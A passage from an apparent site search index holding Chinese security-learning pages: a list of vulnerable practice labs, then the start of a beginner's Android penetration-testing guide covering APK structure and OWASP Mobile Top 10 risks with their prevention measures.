U2\u5b89\u5168\u5de1\u822a\u9776\u573a\uff1a</p> <ul> <li>http://scan.vulspace.com</li> </ul> <p>11. MS08067\u5b9e\u6218\u578b\u8bad\u7ec3\u5e73\u53f0\uff1a</p> <ul> <li>http://bachang.ms08067.com</li> </ul> <p>12. \u4e1c\u5854\u5728\u7ebf\u9776\u573a\uff1a</p> <ul> <li>https://labs.do-ta.com/index/course/index</li> </ul> <p>0x03\u00a0\u6f0f\u6d1e\u9776\u573a</p> <p>1. DVWA\uff1a</p> <ul> <li>http://www.dvwa.co.uk</li> </ul> <p>2. BWVS\uff1a</p> <ul> <li>https://github.com/bugku/BWVS</li> </ul> <p>3. BWAPP\uff1a</p> <ul> <li>https://sourceforge.net/projects/bwapp</li> </ul> <p>4. WAVSEP\uff1a</p> <ul> <li>https://github.com/sectooladdict/wavsep</li> </ul> <p>5. VulnStack\uff1a</p> <ul> <li>http://vulnstack.qiyuanxuetang.net/vuln</li> </ul> <p>6. Sqli-Labs\uff1a </p> <ul> <li>https://github.com/Audi-1/sqli-labs</li> </ul> <p>7. Webug 3.0\uff1a</p> <ul> <li>https://pan.baidu.com/s/1eRIB3Se</li> </ul> <p>8. Upload-labs\uff1a</p> <ul> <li>https://github.com/c0ny1/upload-labs</li> </ul> <p>9. Metasploitable\uff1a</p> <ul> <li>https://github.com/rapid7/metasploitable3</li> </ul> <p>10. DVWA-WooYun\uff1a</p> <ul> <li>https://sourceforge.net/projects/dvwa-wooyun</li> </ul> <p>11. OWASP Mutillidae\uff1a</p> <ul> <li>https://sourceforge.net/projects/mutillidae</li> </ul> <p>12. Web for Pentester\uff1a</p> <ul> <li>https://www.pentesterlab.com/exercises/web_for_pentester</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/","title":"\u9762\u5411\u521d\u5b66\u8005\u7684\u5206\u6b65 Android \u6e17\u900f\u6d4b\u8bd5\u6307\u5357","text":"<p>\u901a\u8fc7\u5206\u6b65\u8bf4\u660e\u4e86\u89e3 Android \u6e17\u900f\u6d4b\u8bd5\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u4ee5\u53d1\u73b0\u6f0f\u6d1e\u5e76\u63d0\u9ad8\u79fb\u52a8\u5b89\u5168\u6027\u3002</p> <p></p> <p>\u5199\u4e8e 2022 \u5e74\u00a010 \u6708 18 \u65e5</p> <p>![[Pasted image 20221025193901.png]]</p> <p>\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u548c\u670d\u52a1\u5bf9\u4e8e\u6211\u4eec\u5728\u5bb6\u4e2d\u548c\u5de5\u4f5c\u4e2d\u7684\u65e5\u5e38\u751f\u6d3b\u81f3\u5173\u91cd\u8981\u3002\u8fd9\u4f7f\u5b83\u4eec\u6210\u4e3a\u5bfb\u6c42\u654f\u611f\u4fe1\u606f\u7684\u6076\u610f\u884c\u4e3a\u8005\u7684\u4e3b\u8981\u76ee\u6807\u3002\u00a0</p> <p>\u5728\u672c\u6307\u5357\u4e2d\uff0c\u60a8\u5c06\u5728\u6267\u884c\u79fb\u52a8\u8bc4\u4f30\u4ee5\u63d0\u9ad8\u5b89\u5168\u6027\u65f6\u5b66\u4e60\u57fa\u672c\u7684 Android \u6e17\u900f\u6d4b\u8bd5\u6280\u672f\u3002\u9996\u5148\uff0c\u6211\u4eec\u5c06\u8bbe\u7f6e\u73af\u5883\u4ee5\u5f00\u59cb\u6d4b\u8bd5\uff0c\u7136\u540e\u68c0\u67e5\u5728\u79fb\u52a8\u8bc4\u4f30\u4e2d\u6709\u7528\u7684\u5de5\u5177\u7684\u529f\u80fd\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#_1","title":"\u4ec0\u4e48\u662f\u5b89\u5353\u6e17\u900f\u6d4b\u8bd5\uff1f","text":"<p>\u79fb\u52a8\u6216\u5b89\u5353\u6e17\u900f\u6d4b\u8bd5\u65e8\u5728\u68c0\u6d4b\u5b89\u5168\u6f0f\u6d1e\u5e76\u786e\u4fdd\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u4e0d\u6613\u53d7\u5230\u653b\u51fb\u3002\u00a0</p> <p></p> <p>\uff08Android \u548c iOS \u64cd\u4f5c\u7cfb\u7edf\u7684\u5e02\u573a\u4efd\u989d\u5408\u8ba1\u4e3a 99.35%\u3002\uff09</p> <p>\u53ef\u4ee5\u4f7f\u7528\u81ea\u52a8\u5316\u5de5\u5177\u6216\u624b\u52a8\u5206\u6790 Android \u5e94\u7528\u7a0b\u5e8f\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u79fb\u52a8\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u5c06\u4f7f\u7528\u591a\u79cd\u6280\u672f\u6765\u6a21\u62df\u653b\u51fb\uff0c\u53d1\u73b0\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u5e76\u83b7\u5f97\u5bf9\u654f\u611f\u6570\u636e\u7684\u8bbf\u95ee\u6743\u9650\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#android","title":"\u4e3a\u4ec0\u4e48Android\u6e17\u900f\u6d4b\u8bd5\u5f88\u91cd\u8981","text":"<p>\u73b0\u4ee3 Android \u5e94\u7528\u7a0b\u5e8f\u7528\u4e8e\u5546\u4e1a\u76ee\u7684\u3001\u533b\u7597\u4fdd\u5065\u3001\u94f6\u884c\u4e1a\u52a1\u3001\u5b66\u4e60\u7b49\u3002\u8fd9\u4e9b\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u9664\u4e86\u4fdd\u5b58\u654f\u611f\u4fe1\u606f\u5916\uff0c\u8fd8\u5305\u542b\u5b89\u5168\u6f0f\u6d1e\u3002\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u548c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u53d1\u73b0\u5e76\u4fee\u590d\u8fd9\u4e9b\u6f0f\u6d1e\u5e76\u964d\u4f4e\u5b89\u5168\u98ce\u9669\u3002</p> <p>2021 \u5e74\uff0c\u652f\u4ed8\u5e94\u7528\u7a0b\u5e8f Klarna \u906d\u9047\u5e94\u7528\u7a0b\u5e8f\u7f3a\u9677\uff0c\u5bfc\u81f4\u7528\u6237\u968f\u673a\u767b\u5f55\u5176\u4ed6\u5ba2\u6237\u7684\u5e10\u6237\u5e76\u66b4\u9732\u654f\u611f\u7684\u4e2a\u4eba\u548c\u4fe1\u7528\u5361\u4fe1\u606f\u3002\u00a0\u00a0\u00a0</p> <p>ParkMobile \u662f\u7f8e\u56fd\u65e0\u73b0\u91d1\u505c\u8f66\u5e94\u7528\u7a0b\u5e8f\u80cc\u540e\u7684\u516c\u53f8\uff0c\u8be5\u516c\u53f8\u4ecd\u5728\u4e0e 2021 \u5e74\u5f71\u54cd 2100 \u4e07\u7528\u6237\u7684\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u6cc4\u9732\u4e8b\u4ef6\u8fdb\u884c\u96c6\u4f53\u8bc9\u8bbc\u3002</p> <p>\u968f\u7740\u6bcf\u5929\u90fd\u6709\u65b0\u7684\u6f0f\u6d1e\u6d6e\u51fa\u6c34\u9762\uff0cAndroid \u6e17\u900f\u6d4b\u8bd5\u5bf9\u4e8e\u907f\u514d\u6b3a\u8bc8\u653b\u51fb\u3001\u6076\u610f\u8f6f\u4ef6\u611f\u67d3\u548c\u6570\u636e\u6cc4\u9732\u662f\u5fc5\u8981\u7684\u3002\u8fd9\u5bf9\u4e8e\u4efb\u4f55\u60f3\u8981\u4f7f\u7528\u65b0\u5e94\u7528\u7a0b\u5e8f\u800c\u4e0d\u5fc5\u62c5\u5fc3\u6cd5\u5f8b\u6216\u5b89\u5168\u95ee\u9898\u7684\u516c\u53f8\u6765\u8bf4\u90fd\u662f\u81f3\u5173\u91cd\u8981\u7684\u3002</p> <p>\u79fb\u52a8\u6e17\u900f\u6d4b\u8bd5\u8fd8\u6709\u52a9\u4e8e\u8bc4\u4f30\u5f00\u53d1\u56e2\u961f\u7684\u5de5\u4f5c\u548c\u68c0\u67e5 IT \u56e2\u961f\u7684\u54cd\u5e94\u80fd\u529b\uff0c\u56e0\u4e3a\u6d4b\u8bd5\u53ef\u4ee5\u63ed\u793a\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u540e\u7aef\u670d\u52a1\u4e2d\u7684\u6f0f\u6d1e\u548c\u9519\u8bef\u914d\u7f6e\u3002</p> <p>\ud83c\udfae \u73b0\u5728\u6d4b\u8bd5\u4f60\u7684\u5b89\u5353\u6e17\u900f\u6d4b\u8bd5\u6280\u80fd</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#android-apk","title":"Android\u5305 (APK) \u6587\u4ef6\u7ed3\u6784\u8bf4\u660e","text":"<p>Android \u5305 (APK) \u662f\u4e00\u4e2a\u5e26\u6709 .apk \u540e\u7f00\u7684\u5b58\u6863\u6587\u4ef6\uff0c\u5b83\u5305\u542b\u8fd0\u884c Android \u5e94\u7528\u7a0b\u5e8f\u6240\u9700\u7684\u6240\u6709\u6587\u4ef6\uff08\u4ee3\u7801\u548c\u8d44\u4ea7\uff09\u3002</p> <p>APK \u6587\u4ef6\u53ef\u4ee5\u5728 Linux \u4e2d\u4f7f\u7528\u547d\u4ee4 <code>unzip app_name.apk</code> \u89e3\u538b\u3002\u4e0b\u56fe\u663e\u793a\u4e86 APK \u6587\u4ef6\u7684\u89e3\u538b\u7f29\u7ed3\u6784\uff1a\u00a0</p> <p></p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 METTA-INF\uff1a\u5305\u542b\u5e94\u7528\u7b7e\u540d\u65f6\u751f\u6210\u7684\u9a8c\u8bc1\u4fe1\u606f\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 MANIFEST.MF\uff1a\u5305\u542b APK \u7684\u6240\u6709\u6587\u4ef6\u7684\u540d\u79f0/\u54c8\u5e0c\u5217\u8868\uff08\u901a\u5e38\u4e3a Base64 \u4e2d\u7684 SHA256\uff09\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 CERT.SF\uff1a\u5305\u542b MANIFEST.MF \u6587\u4ef6\u4e2d\u76f8\u5e94\u884c\u7684\u540d\u79f0/\u54c8\u5e0c\u5217\u8868\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 CERT.RSA\uff1a\u6b64\u6587\u4ef6\u5305\u542b CERT.SF \u7684\u516c\u94a5\u548c\u7b7e\u540d\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Assets\uff1a\u5305\u542b\u5f00\u53d1\u4eba\u5458\u4e0e\u5e94\u7528\u7a0b\u5e8f\u6346\u7ed1\u7684\u8d44\u4ea7\uff0c\u53ef\u4ee5\u901a\u8fc7AssetManager\u68c0\u7d22\u3002\u8fd9\u4e9b\u8d44\u4ea7\u53ef\u4ee5\u662f\u56fe\u50cf\u3001\u89c6\u9891\u3001\u6587\u6863\u3001\u6570\u636e\u5e93\u7b49\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 lib\uff1a\u5305\u542b\u5e26\u6709\u7f16\u8bd1\u4ee3\u7801\u7684\u672c\u673a\u5e93\uff0c\u7528\u4e8e\u4e0d\u540c\u7684\u8bbe\u5907\u67b6\u6784\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 res\uff1a\u5305\u542b\u9884\u5b9a\u4e49\u7684\u5e94\u7528\u7a0b\u5e8f\u8d44\u6e90\uff0c\u4f8b\u5982\u5b9a\u4e49\u989c\u8272\u72b6\u6001\u5217\u8868\u3001\u7528\u6237\u754c\u9762\u5e03\u5c40\u3001\u5b57\u4f53\u3001\u503c\u7b49\u7684 XML \u6587\u4ef6\u3002\u00a0</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 AndroidManifest.xml\uff1a\u4e00\u4e2a\u6e05\u5355\u6587\u4ef6\uff0c\u63cf\u8ff0\u4e86\u5e94\u7528\u7a0b\u5e8f\u7684\u5305\u540d\u3001\u6d3b\u52a8\u3001\u8d44\u6e90\u3001\u7248\u672c\u7b49\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 classes.dex\uff1a\u00a0\u5305\u542b dex\uff08Dalvik Executable\uff09\u6587\u4ef6\u683c\u5f0f\u7684\u6240\u6709 java \u7c7b\uff0c\u7531Android Runtime\u6267\u884c\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 resources.arsc\uff1a\u5305\u542b\u9884\u7f16\u8bd1\u7684\u8d44\u6e90\u3002\u5b83\u5305\u542b\u5c06\u4ee3\u7801\u94fe\u63a5\u5230\u8d44\u6e90\u7684\u4fe1\u606f\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#owasp-mobile-top-10","title":"\u4ece OWASP Mobile Top 10 \u5f00\u59cb\u5bfb\u627e\u6f0f\u6d1e","text":"<p>\u5f00\u653e Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u9879\u76ee (OWASP) \u662f\u4e00\u4e2a\u975e\u8425\u5229\u6027\u57fa\u91d1\u4f1a\uff0c\u4e3b\u8981\u4e3a Web \u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u5b89\u5168\u63d0\u793a\u548c\u65b9\u6cd5\u30022016 \u5e74\uff0cOWASP \u521b\u5efa\u4e86\u6700\u65b0\u7684\u79fb\u52a8\u5341\u5927\u6f0f\u6d1e\u5217\u8868\u3002\u5b83\u6307\u7684\u662f\u6bcf\u4e2a\u6f0f\u6d1e\u5bf9\u4e2a\u4eba\u548c\u4f01\u4e1a\u7684\u5f71\u54cd\uff0c\u5e76\u63d0\u51fa\u4e86\u9884\u9632\u65b9\u6cd5\u3002</p> <p>\u5982\u679c\u60a8\u4e0d\u719f\u6089 Android \u6e17\u900f\u6d4b\u8bd5\uff0c\u8fd9\u4e9b\u6f0f\u6d1e\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u8d77\u70b9\uff0c\u53ef\u4ee5\u5e2e\u52a9\u60a8\u53d1\u73b0\u7f3a\u9677\u5e76\u63d0\u9ad8\u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u5168\u6027\uff1a</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#_2","title":"\u5e73\u53f0\u4f7f\u7528\u4e0d\u5f53","text":"<p>\u6b64\u7c7b\u522b\u5305\u62ec\u6ee5\u7528\u5e73\u53f0\u529f\u80fd\uff0c\u4f8b\u5982 Android \u610f\u56fe\u3001\u5e73\u53f0\u6743\u9650\u3001TouchID\u3001\u94a5\u5319\u4e32\uff0c\u6216\u672a\u80fd\u4f7f\u7528\u79fb\u52a8\u64cd\u4f5c\u7cfb\u7edf\u7684\u5e73\u53f0\u5b89\u5168\u63a7\u5236\u3002\u4e3a\u4e86\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u7ec4\u7ec7\u5fc5\u987b\u516c\u5f00\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684 Web \u670d\u52a1\u6216 API \u8c03\u7528\u3002</p> <p>\u6f0f\u6d1e\u7684\u5f71\u54cd\uff1a\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u5f71\u54cd\u8303\u56f4\u4ece\u66f4\u6539\u5e94\u7528\u7a0b\u5e8f\u7684\u5185\u5bb9\u5230\u5b8c\u6574\u7684\u5e10\u6237\u6cc4\u9732\u3002</p> <p>\u9884\u9632\uff1a\u5fc5\u987b\u5728\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u7684\u670d\u52a1\u5668\u7aef\u4f7f\u7528\u5b89\u5168\u7f16\u7801\u548c\u914d\u7f6e\u5b9e\u8df5\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#_3","title":"\u4e0d\u5b89\u5168\u7684\u6570\u636e\u5b58\u50a8","text":"<p>\u5728\u8bbe\u5907\u7684\u672c\u5730\u5b58\u50a8\u4e2d\u5b58\u50a8\u672a\u52a0\u5bc6\u7684\u6570\u636e\u662f\u4e00\u79cd\u4e0d\u597d\u7684\u505a\u6cd5\uff0c\u56e0\u4e3a\u6709\u6076\u610f\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u4ece\u4e2d\u68c0\u7d22\u654f\u611f\u4fe1\u606f\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u76f4\u63a5\u4ece\u88ab\u76d7\u8bbe\u5907\u4e2d\u68c0\u7d22\u6570\u636e\u3002</p> <p>\u6f0f\u6d1e\u5f71\u54cd\uff1a\u5229\u7528\u6b64\u6f0f\u6d1e\u53ef\u80fd\u5bfc\u81f4\u6570\u636e\u4e22\u5931\u548c/\u6216\u5e94\u7528\u7a0b\u5e8f\u654f\u611f\u4fe1\u606f\u88ab\u63d0\u53d6\u3002\u4e1a\u52a1\u5f71\u54cd\u5305\u62ec\u8eab\u4efd\u76d7\u7528\u3001\u6b3a\u8bc8\u3001\u58f0\u8a89\u635f\u5bb3\u3001\u5916\u90e8\u653f\u7b56\u8fdd\u89c4 (PCI) \u548c\u7269\u8d28\u635f\u5931\u3002</p> <p>\u9884\u9632\uff1a\u4e3a\u9632\u6b62\u6b64\u7c7b\u653b\u51fb\uff0c\u60a8\u53ef\u4ee5\u52a0\u5bc6\u5b58\u50a8\u7684\u6570\u636e\u6216/\u548c\u9650\u5236\u5bf9\u672c\u5730\u6570\u636e\u5b58\u50a8\u7684\u8bbf\u95ee\u3002\u6b63\u5982 OWASP \u6240\u5efa\u8bae\u7684\uff0c\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u7684\u4fe1\u606f\u8d44\u4ea7\u4ee5\u53ca API \u5982\u4f55\u5904\u7406\u8fd9\u4e9b\u8d44\u4ea7\u975e\u5e38\u91cd\u8981\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#3","title":"3. \u4e0d\u5b89\u5168\u7684\u901a\u4fe1","text":"<p>\u5728\u8fd9\u79cd\u7c7b\u578b\u7684\u653b\u51fb\u4e2d\uff0c\u6076\u610f\u884c\u4e3a\u8005\u5229\u7528\u6f0f\u6d1e\u62e6\u622a\u53d7\u611f\u67d3\u7f51\u7edc\u4e2d\u7684\u654f\u611f\u6570\u636e\uff08\u4f8b\u5982\u76d1\u63a7\u516c\u53f8\u7684\u7f51\u7edc\u6d41\u91cf\uff09\u3002\u6709\u9488\u5bf9\u6027\u7684\u653b\u51fb\u66f4\u5bb9\u6613\u6267\u884c\u3002</p> <p>\u6f0f\u6d1e\u5f71\u54cd\uff1a\u901a\u8fc7\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u66b4\u9732\u4e2a\u4eba\u6570\u636e\uff0c\u751a\u81f3\u5b8c\u5168\u7834\u574f\u5e10\u6237\u548c\u670d\u52a1\u5668\u3002\u5bf9\u4e8e\u4f01\u4e1a\u800c\u8a00\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u9690\u79c1\u4fb5\u72af\uff0c\u8fdb\u800c\u53ef\u80fd\u5bfc\u81f4\u8eab\u4efd\u76d7\u7528\u3001\u6b3a\u8bc8\u6216\u58f0\u8a89\u53d7\u635f\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#_4","title":"\u9884\u9632\uff1a","text":"<p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u4f7f\u7528 SSL/TLS \u534f\u8bae\u8fdb\u884c\u5b89\u5168\u901a\u4fe1\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u4f9d\u9760\u5177\u6709\u9002\u5f53\u5bc6\u94a5\u957f\u5ea6\u7684\u5f3a\u5927\u884c\u4e1a\u6807\u51c6\u5bc6\u7801\u5957\u4ef6\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u786e\u4fdd\u8bc1\u4e66\u7531\u53d7\u4fe1\u4efb\u7684 CA \u63d0\u4f9b\u5546\u7b7e\u540d\uff0c\u800c\u4e0d\u662f\u81ea\u7b7e\u540d\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u9700\u8981 SSL \u94fe\u9a8c\u8bc1\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u5728\u5c06\u654f\u611f\u6570\u636e\u63d0\u4f9b\u7ed9 SSL \u901a\u9053\u4e4b\u524d\uff0c\u5bf9\u4efb\u4f55\u654f\u611f\u6570\u636e\u5e94\u7528\u5355\u72ec\u7684\u52a0\u5bc6\u5c42\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#4","title":"4. \u4e0d\u5b89\u5168\u7684\u8eab\u4efd\u9a8c\u8bc1","text":"<p>\u653b\u51fb\u8005\u901a\u5e38\u4f7f\u7528\u53ef\u7528\u6216\u81ea\u5b9a\u4e49\u7684\u81ea\u52a8\u5316\u5de5\u5177\u6765\u5229\u7528\u6b64\u6f0f\u6d1e\u3002\u4ed6\u4eec\u5c1d\u8bd5\u4f7f\u7528\u9ed8\u8ba4\u51ed\u636e\u6216\u7ed5\u8fc7\u5b9e\u65bd\u4e0d\u4f73\u7684\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u767b\u5f55\u3002</p> <p>\u6f0f\u6d1e\u5f71\u54cd\uff1a\u8eab\u4efd\u9a8c\u8bc1\u4e0d\u5f53\u7684\u5f71\u54cd\u53ef\u80fd\u5bfc\u81f4\u58f0\u8a89\u53d7\u635f\u3001\u4fe1\u606f\u88ab\u76d7\u6216\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u6570\u636e\u3002</p> <p>\u9884\u9632\uff1a</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u786e\u4fdd\u6240\u6709\u8eab\u4efd\u9a8c\u8bc1\u8bf7\u6c42\u90fd\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u4f7f\u7528\u5ba2\u6237\u7aef\u5b58\u50a8\u65f6\u52a0\u5bc6\u6570\u636e\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u68c0\u67e5\u5728\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b9e\u73b0\u7684\u6301\u4e45\u8eab\u4efd\u9a8c\u8bc1\uff08\u8bb0\u4f4f\u6211\uff09\u529f\u80fd\u6c38\u8fdc\u4e0d\u5e94\u5c06\u7528\u6237\u5bc6\u7801\u5b58\u50a8\u5728\u8bbe\u5907\u4e0a\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u786e\u4fdd\u5e94\u7528\u7a0b\u5e8f\u5fc5\u987b\u4f7f\u7528\u7279\u5b9a\u4e8e\u8bbe\u5907\u7684\u8eab\u4efd\u9a8c\u8bc1\u4ee4\u724c\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u4e0d\u5141\u8bb8\u7528\u6237\u63d0\u4f9b 4 \u4f4d PIN \u7801\u4f5c\u4e3a\u9a8c\u8bc1\u5bc6\u7801\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#5","title":"5. \u5bc6\u7801\u5b66\u4e0d\u8db3","text":"<p>\u672a\u6b63\u786e\u52a0\u5bc6\u7684\u6570\u636e\u53ef\u4ee5\u88ab\u5177\u6709\u7269\u7406\u8bbf\u95ee\u6743\u9650\u7684\u653b\u51fb\u8005\u6216\u901a\u8fc7\u6076\u610f\u8f6f\u4ef6\u5e94\u7528\u7a0b\u5e8f\u8fd8\u539f\u3002</p> <p>\u6f0f\u6d1e\u5f71\u54cd\uff1a\u6b64\u6f0f\u6d1e\u5c06\u5bfc\u81f4\u672a\u7ecf\u6388\u6743\u4ece\u79fb\u52a8\u8bbe\u5907\u4e2d\u68c0\u7d22\u654f\u611f\u4fe1\u606f\u3002\u6b64\u5916\uff0c\u8fd9\u53ef\u80fd\u4f1a\u4ea7\u751f\u8bb8\u591a\u4e0d\u540c\u7684\u4e1a\u52a1\u5f71\u54cd\uff0c\u4f8b\u5982\u4fb5\u72af\u9690\u79c1\u3001\u4fe1\u606f\u76d7\u7a83\u3001\u4ee3\u7801\u76d7\u7a83\u3001\u77e5\u8bc6\u4ea7\u6743\u76d7\u7a83\u6216\u58f0\u8a89\u635f\u5bb3\u3002</p> <p>\u9884\u9632\uff1a\u4e3a\u9632\u6b62\u8fd9\u79cd\u653b\u51fb\uff0c\u5e94\u907f\u514d\u5728\u79fb\u52a8\u8bbe\u5907\u4e2d\u5b58\u50a8\u654f\u611f\u6570\u636e\uff0c\u5e94\u7528\u80fd\u591f\u7ecf\u53d7\u4f4f\u672a\u6765\u81f3\u5c11 10 \u5e74\u65f6\u95f4\u8003\u9a8c\u7684\u52a0\u5bc6\u6807\u51c6\uff0c\u5e76\u9075\u5faaNIST \u5173\u4e8e\u63a8\u8350\u7b97\u6cd5\u7684\u6307\u5357\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#6","title":"6.\u4e0d\u5b89\u5168\u7684\u6388\u6743","text":"<p>\u653b\u51fb\u8005\u901a\u5e38\u4f7f\u7528\u53ef\u7528\u6216\u81ea\u5b9a\u4e49\u7684\u81ea\u52a8\u5316\u5de5\u5177\u4ee5\u5408\u6cd5\u7528\u6237\u8eab\u4efd\u767b\u5f55\u5e94\u7528\u7a0b\u5e8f\u3002\u767b\u5f55\u540e\uff0c\u4ed6\u4eec\u53ef\u4ee5\u5bf9\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u4e8c\u8fdb\u5236\u653b\u51fb\uff0c\u5e76\u5c1d\u8bd5\u6267\u884c\u53ea\u6709\u5728\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u5904\u4e8e\u201c\u79bb\u7ebf\u201d\u6a21\u5f0f\u65f6\u624d\u80fd\u7531\u66f4\u9ad8\u6743\u9650\u7684\u7528\u6237\u6267\u884c\u7684\u7279\u6743\u529f\u